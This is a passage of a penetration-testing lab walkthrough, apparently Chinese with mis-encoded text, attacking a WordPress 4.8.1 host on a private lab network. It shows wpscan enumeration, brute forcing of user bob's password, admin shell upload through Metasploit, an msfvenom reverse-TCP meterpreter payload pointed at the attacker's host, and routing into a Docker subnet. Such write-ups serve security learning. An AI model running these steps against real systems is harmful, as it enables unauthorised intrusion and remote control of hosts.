 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
[+] WordPress readme found: http://192.168.32.225:8000/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[+] The external WP-Cron seems to be enabled: http://192.168.32.225:8000/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.32.225:8000/feed/, https://wordpress.org/?v=4.8.1
 |  - http://192.168.32.225:8000/comments/feed/, https://wordpress.org/?v=4.8.1
[+] WordPress theme in use: twentyseventeen
 | Location: http://192.168.32.225:8000/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://192.168.32.225:8000/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://192.168.32.225:8000/wp-content/themes/twentyseventeen/style.css?ver=4.8.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.32.225:8000/wp-content/themes/twentyseventeen/style.css?ver=4.8.1, Match: 'Version: 1.3'
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02  (137 / 137) 100.00% Time: 00:00:02
[i] No Config Backups Found.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
[+] Finished: Sun Sep 11 03:30:00 2022
[+] Requests Done: 171
[+] Cached Requests: 7
[+] Data Sent: 44.524 KB
[+] Data Received: 476.498 KB
[+] Memory used: 228.035 MB
[+] Elapsed time: 00:00:05
```
æšä¸¾ç”¨æˆ·
```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# wpscan --url http://192.168.32.225:8000 --enumerate u
[+] bob
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.32.225:8000/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
çˆ†ç ´bobçš„å¯†ç ï¼Œå‘ç°å¯†ç ï¼š`Welcome1`
```
â”Œâ”€â”€(rootğŸ’€kali)-[/opt]
â””â”€# wpscan --url http://192.168.32.225:8000 -U bob -P /opt/10_million_password_list_top_10000.txt 
[!] Valid Combinations Found:
 | Username: bob, Password: Welcome1
```
è®¿é—®ï¼š`/wp-admin`
![image-20220911153550320](../../.gitbook/assets/image-20220911153550320.png)
æˆ‘ä»¬åœ¨ Wordpress ä¸­æœ‰ç®¡ç†å‘˜ï¼Œè®©æˆ‘ä»¬åœ¨ï¼ˆå¤§æ¦‚ï¼‰å®¹å™¨ä¸­è·å–ä¸€ä¸ª shellï¼š
```
use exploit/unix/webapp/wp_admin_shell_upload
set PASSWORD Welcome1
set USERNAME bob
set RHOST 192.168.32.225
set RPORT 8000
run
```
![image-20220911154355217](../../.gitbook/assets/image-20220911154355217.png)
æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªmeterpreterã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘è¢«å¡ä½äº†ä¸€æ®µæ—¶é—´ã€‚æˆ‘é¦–å…ˆå¼€å§‹æœç´¢ä¸€äº› setuid äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†è¿™å¹¶æ²¡æœ‰è®©æˆ‘åˆ°ä»»ä½•åœ°æ–¹ã€‚å› æ­¤ï¼Œæˆ‘å°è¯•æŸ¥æ‰¾æœ‰å…³ç½‘ç»œçš„ä¿¡æ¯ï¼š
```
ip addr
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0:  mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 scope global eth0
       valid_lft forever preferred_lft forever
```
å› æ­¤ï¼Œæˆ‘å°è¯•è®¾ç½®ä¸€äº›åˆ° 172.18.0.4/16 ç½‘ç»œçš„è·¯ç”±æ¥è¿›è¡Œç«¯å£æ‰«æï¼Œä½†æ­¤æ—¶æˆ‘ä¸€ç›´é‡åˆ°é—®é¢˜ï¼Œå³ä½¿è®¾ç½®äº†è·¯ç”±ï¼Œç«¯å£æ‰«æä¹Ÿä¼šæ˜¾ç¤ºæ•´ä¸ª 172.18 çš„å¼€æ”¾ç«¯å£ã€‚ 0.0/24 ç½‘ç»œï¼Œå¥½åƒå‡ºæ¥äº†ã€‚
æˆ‘å¯¹æ­¤ä¸€å¤´é›¾æ°´ï¼Œæœ€ç»ˆè®¤ä¸ºè¿™å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯åŸºäº PHP çš„ Meterpreterï¼Œè€Œä¸”æ˜¾ç„¶å®ƒçš„åŠŸèƒ½ç›¸å½“æœ‰é™ï¼ˆä¾‹å¦‚ï¼Œæ²¡æœ‰ ipconfigï¼‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ç»§ç»­ç”Ÿæˆäº†ä¸€ä¸ªå®Œæ•´çš„ä»ªè¡¨å¹¶å°†å…¶æ”¾å…¥å®¹å™¨ä¸­ï¼š
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.32.130 LPORT=4444 -f elf > shell.elf                                                                                                                                                                                                         
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 1101336 bytes
Final size of elf file: 1101336 bytes
```
ä¸Šä¼ shell
```
meterpreter > cd /tmp
meterpreter > upload /tmp/shell.elf
[*] uploading  : /tmp/shell.elf -> shell.elf
[*] Uploaded -1.00 B of 1.05 MiB (0.0%): /tmp/shell.elf -> shell.elf
[*] uploaded   : /tmp/shell.elf -> shell.elf
```
![image-20220911154827574](../../.gitbook/assets/image-20220911154827574.png)
```
meterpreter > getuid
Server username: www-data @ 8f4bca8ef241 (uid=33, gid=33, euid=33, egid=33)
meterpreter > ifconfig
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
Interface  5
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.18.0.2
IPv4 Netmask : 255.255.0.0
```
docker å®¹å™¨æ·»åŠ äº†åˆ°å­ç½‘çš„è·¯ç”±
```
meterpreter > run autoroute -s 172.18.0.0/24
```
## easy